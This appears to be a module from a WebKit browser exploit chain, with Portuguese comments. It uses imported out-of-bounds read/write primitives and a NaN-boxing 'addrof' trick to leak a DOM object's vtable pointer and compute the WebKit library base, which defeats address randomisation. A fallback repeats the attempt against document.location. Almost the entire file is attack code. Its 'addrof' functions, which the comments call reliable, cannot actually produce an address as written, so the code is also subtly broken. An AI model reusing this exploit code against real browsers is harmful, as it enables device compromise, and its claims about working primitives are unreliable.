// js/script3/testArrayBufferVictimCrash.mjs (v111 - Estratégia Híbrida Avançada com Uncaged Array)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// - Incorpora a análise das mitigações Gigacage e NaN Boxing.
// - Mantém as primitivas de R/W robustas do core_exploit.
// - Substitui a estratégia de `addrof` falha por uma que utiliza um Array "uncaged" para
//   confiabilidade, conforme sugerido pela análise de logs de sucesso.
// - O alvo para o vazamento da vtable foi alterado para um objeto DOM mais estável.
// - A estrutura de testes foi reorganizada para rodar a estratégia mais promissora primeiro,
//   mantendo os testes antigos para fins de depuração.
// =======================================================================================

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    isOOBReady,
    arb_read,
    selfTestOOBReadWrite
} from '../core_exploit.mjs';

export const FNAME_MODULE_FINAL = "Uncaged_Hybrid_v111_CorePrimitives";

// --- Funções de Conversão (Double <-> Int64) - Essenciais para a técnica de NaN Boxing ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}


// =======================================================================================
// #NOVO: TESTE DE VAZAMENTO DA BASE DO WEBKIT (Estratégia Uncaged)
// =======================================================================================
async function runWebKitBaseLeakTest_Uncaged(addrof_primitive, arb_read_primitive) {
    const FNAME_LEAK_TEST = "WebKitBaseLeakTest_v111_Uncaged";
    logS3(`--- Iniciando Teste de Vazamento da Base do WebKit (Estratégia Uncaged) ---`, "subtest", FNAME_LEAK_TEST);
    try {
        // 1. Alocar um objeto alvo que certamente possui uma vtable e está na memória do WebKit.
        //    Um elemento DOM é um candidato muito mais estável do que document.location.
        const target_obj = document.createElement('div');
        logS3(`[PASSO 1] Alvo para o vazamento: Objeto HTMLDivElement`, "info", FNAME_LEAK_TEST);

        // 2. Usar a primitiva 'addrof' (baseada no array uncaged) para obter o endereço do objeto.
        const target_addr = addrof_primitive(target_obj);
        logS3(`[PASSO 2] Endereço do objeto HTMLDivElement (via addrof uncaged): ${toHex(target_addr)}`, "leak", FNAME_LEAK_TEST);
        if (target_addr.low() === 0 && target_addr.high() === 0) {
            throw new Error("addrof retornou um endereço nulo para o objeto alvo.");
        }

        // 3. Ler o primeiro campo (8 bytes) do objeto. Este deve ser o ponteiro da vtable.
        logS3(`[PASSO 3] Lendo 8 bytes de ${toHex(target_addr)} para obter o ponteiro da vtable...`, "info", FNAME_LEAK_TEST);
        const vtable_ptr = await arb_read_primitive(target_addr, 8);
        logS3(`[PASSO 4] Ponteiro da Vtable vazado (via arb_read): ${toHex(vtable_ptr)}`, "leak", FNAME_LEAK_TEST);
        if (vtable_ptr.low() === 0 && vtable_ptr.high() === 0) {
            throw new Error("Ponteiro da vtable vazado é nulo. A leitura pode ter falhado ou o objeto é inválido.");
        }

        // 4. Calcular o endereço base alinhando o ponteiro da vtable para baixo.
        const ALIGNMENT_MASK = new AdvancedInt64(0x3FFF, 0).not();
        const webkit_base_candidate = vtable_ptr.and(ALIGNMENT_MASK);
        logS3(`[PASSO 5] Candidato a endereço base do WebKit (alinhado): ${toHex(webkit_base_candidate)}`, "leak", FNAME_LEAK_TEST);

        // 5. Verificação de Sanidade: Ler os primeiros 4 bytes do endereço base e checar a assinatura "ELF".
        logS3(`[PASSO 6] Verificando assinatura ELF em ${toHex(webkit_base_candidate)}...`, "info", FNAME_LEAK_TEST);
        const elf_magic_full = await arb_read_primitive(webkit_base_candidate, 8);
        const elf_magic_low = elf_magic_full.low();
        logS3(`[PASSO 7] Assinatura lida do endereço base: ${toHex(elf_magic_low)}`, "leak", FNAME_LEAK_TEST);
        
        // A assinatura ELF é 0x7F seguido por 'E', 'L', 'F'. Em little-endian, isso é 0x464C457F.
        if (elf_magic_low === 0x464C457F) {
            logS3(`++++++++++++ SUCESSO DE VAZAMENTO! Assinatura ELF encontrada! ++++++++++++`, "vuln", FNAME_LEAK_TEST);
            logS3(`A base do WebKit é muito provavelmente: ${toHex(webkit_base_candidate)}`, "vuln", FNAME_LEAK_TEST);
            return { success: true, webkit_base: webkit_base_candidate.toString(true) };
        } else {
            throw new Error(`Assinatura ELF não encontrada. Lido: ${toHex(elf_magic_low)}, Esperado: 0x464C457F.`);
        }

    } catch(e) {
        logS3(`[FALHA] Falha no teste de vazamento do WebKit (Uncaged): ${e.message}`, "critical", FNAME_LEAK_TEST);
        console.error(e);
        return { success: false, webkit_base: null };
    }
}


// #MODIFICADO: Função orquestradora que implementa a nova estratégia de forma isolada.
async function runAdvancedHybridStrategy() {
    const FNAME_ADVANCED_TEST = `${FNAME_MODULE_FINAL}_Advanced`;
    logS3(`--- Iniciando ${FNAME_ADVANCED_TEST}: Estratégia com Array Uncaged e Alvo DOM ---`, "test");

    try {
        // --- FASE 1: VALIDAR PRIMITIVAS DE LEITURA/ESCRITA DO CORE ---
        logS3("--- FASE 1/3: Validando primitivas de Leitura/Escrita do core_exploit... ---", "subtest");
        const self_test_ok = await selfTestOOBReadWrite(logS3);
        if (!self_test_ok) {
            throw new Error("Autoteste das primitivas de L/E do core_exploit FALHOU. Abortando.");
        }
        logS3("Autoteste de L/E concluído com SUCESSO. Primitivas 'arb_read' e 'arb_write' estão operacionais.", "vuln");

        // --- FASE 2: CONFIGURAR PRIMITIVA 'addrof' CONFIÁVEL (Uncaged) ---
        logS3("--- FASE 2/3: Configurando primitiva 'addrof' com Array Uncaged... ---", "subtest");
        
        // REASONING: Um array de float é um objeto "uncaged". 
        // A type confusion é mais provável de funcionar aqui do que em um objeto DOM complexo.
        const uncaged_array_for_addrof = [13.37]; 
        
        // O offset de NaN Boxing. O valor é subtraído do JSValue lido como double para obter o ponteiro real.
        const NAN_BOXING_OFFSET = new AdvancedInt64(0, 0x0001);

        const addrof_uncaged = (obj_to_find) => {
            uncaged_array_for_addrof[0] = obj_to_find;
            let value_as_double = uncaged_array_for_addrof[0];
            let value_as_int64 = doubleToInt64(value_as_double);
            // Remove a máscara do NaN para revelar o ponteiro.
            return value_as_int64.sub(NAN_BOXING_OFFSET);
        };
        logS3("Primitiva 'addrof' confiável (uncaged) está operacional.", "good");
       
        // --- FASE 3: EXECUTAR O VAZAMENTO DA BASE DO WEBKIT ---
        logS3("--- FASE 3/3: Tentando vazar a base do WebKit com a nova estratégia... ---", "subtest");
        const leak_result = await runWebKitBaseLeakTest_Uncaged(addrof_uncaged, arb_read);
        
        if (leak_result.success) {
            return {
                success: true,
                message: "SUCESSO! Estratégia Híbrida Avançada (Uncaged) funcionou. Base do WebKit VAZADA!",
                webkit_base: leak_result.webkit_base
            };
        } else {
             return {
                success: false,
                message: "FALHA na Estratégia Híbrida Avançada. Vazamento da base do WebKit não teve sucesso.",
                webkit_base: null
            };
        }

    } catch (e) {
        logS3(`Exceção crítica na estratégia avançada: ${e.message}\n${e.stack || ''}`, "critical");
        return { success: false, message: e.message, webkit_base: null };
    }
}


// #MODIFICADO: Função principal agora tenta a estratégia avançada primeiro.
export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste com Primitivas Híbridas (v111) ---`, "test");

    let final_result = { success: false, message: "Teste não iniciado corretamente.", webkit_base: null };

    try {
        // --- ETAPA 1: TENTAR A ESTRATÉGIA MAIS MODERNA E CONFIÁVEL ---
        logS3("================ TENTATIVA 1: ESTRATÉGIA AVANÇADA (UNCAGED) ================", "test");
        final_result = await runAdvancedHybridStrategy();

        if (final_result.success) {
            logS3("ESTRATÉGIA AVANÇADA BEM-SUCEDIDA. CONCLUINDO.", "good");
            return final_result;
        }

        // --- ETAPA 2: FALLBACK PARA A ESTRATÉGIA ORIGINAL (PARA DEPURAÇÃO) ---
        logS3("================ TENTATIVA 2: FALLBACK PARA ESTRATÉGIA ORIGINAL ================", "warn");
        
        // FASE 1: INICIALIZAR E VALIDAR PRIMITIVAS DO CORE_EXPLOIT
        logS3("--- FASE 1/4 (Original): Configurando ambiente OOB de core_exploit.mjs... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Falha crítica ao inicializar o ambiente OOB.");
        }
        logS3("Ambiente OOB configurado com sucesso.", "good");

        // FASE 3 (Original): CONFIGURAR PRIMITIVAS 'addrof'
        logS3("--- FASE 3/4 (Original): Configurando primitiva 'addrof' original (NaN Boxing)... ---", "subtest");
        const vulnerable_slot = [13.37]; 
        const NAN_BOXING_OFFSET = new AdvancedInt64(0, 0x0001);
        const addrof_original = (obj) => {
            vulnerable_slot[0] = obj;
            return doubleToInt64(vulnerable_slot[0]).sub(NAN_BOXING_OFFSET);
        };
        logS3("Primitiva 'addrof' original está operacional (mas espera-se que falhe com alvos caged).", "info");
       
        // FASE 4 (Original): EXECUTAR O VAZAMENTO DA BASE DO WEBKIT
        logS3("--- FASE 4/4 (Original): Tentando vazar a base do WebKit com alvo original... ---", "subtest");
        
        // Esta função é uma cópia da original, mantida para teste comparativo.
        const leak_result_original = await (async (addrof_primitive, arb_read_primitive) => {
            const FNAME_LEAK_TEST = "WebKitBaseLeakTest_v110_Original";
            logS3(`--- Iniciando Teste de Vazamento Original ---`, "subtest", FNAME_LEAK_TEST);
            const location_obj = document.location;
            logS3(`[PASS0 1] Alvo: document.location`, "info", FNAME_LEAK_TEST);
            const location_addr = addrof_primitive(location_obj);
            logS3(`[PASS0 2] Endereço do objeto JSLocation (via addrof original): ${toHex(location_addr)}`, "leak", FNAME_LEAK_TEST);
            if (location_addr.low() === 0 && location_addr.high() === 0) {
                 logS3(`[FALHA] addrof original retornou um endereço nulo.`, "critical", FNAME_LEAK_TEST);
                 return { success: false, webkit_base: null };
            }
            const vtable_ptr = await arb_read_primitive(location_addr, 8);
            logS3(`[PASS0 4] Ponteiro da Vtable vazado (via arb_read): ${toHex(vtable_ptr)}`, "leak", FNAME_LEAK_TEST);
            if (vtable_ptr.low() === 0 && vtable_ptr.high() === 0) {
                 logS3(`[FALHA] Ponteiro da vtable vazado é nulo.`, "critical", FNAME_LEAK_TEST);
            }
            return { success: false, webkit_base: null }; // Esperado falhar
        })(addrof_original, arb_read);

        // Atualiza o resultado final para refletir a falha de ambas as estratégias
        final_result = {
            success: false,
            message: "FALHA GERAL: Ambas as estratégias (Avançada e Original) falharam. Verifique os logs para detalhes.",
            webkit_base: null
        };

    } catch (e) {
        final_result.message = `Exceção crítica na implementação: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        console.error(e);
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
